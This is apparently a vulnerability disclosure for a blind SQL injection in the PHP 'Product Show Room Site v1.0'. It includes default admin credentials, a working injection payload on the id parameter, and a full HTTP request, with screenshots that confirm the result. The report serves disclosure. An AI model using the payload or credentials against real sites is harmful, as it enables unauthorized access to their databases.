# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/admin/categories/manage_category.php?id=

Vulnerability location: /psrs/admin/categories/manage_category.php?id=, id

Current database name: hsrs_db ,length is 7

[+] Payload: /psrs/admin/categories/manage_category.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /psrs/admin/categories/manage_category.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

When length (database ()) = 6, Content-Length: 2070
![image](https://user-images.githubusercontent.com/54017627/171829566-c5f70e8b-cb0a-436d-8216-ff3c5127974c.png)

![image](https://user-images.githubusercontent.com/54017627/171829639-621d2a72-d2fe-40a8-8e74-f20e6dad0962.png)

When length (database ()) = 7, Content-Length: 2083
![image](https://user-images.githubusercontent.com/54017627/171829535-aae1ebba-ca62-4889-9373-d43ced83fbb9.png)

![image](https://user-images.githubusercontent.com/54017627/171829599-380eaf5f-856c-485a-a24e-6db8dd83ec56.png)
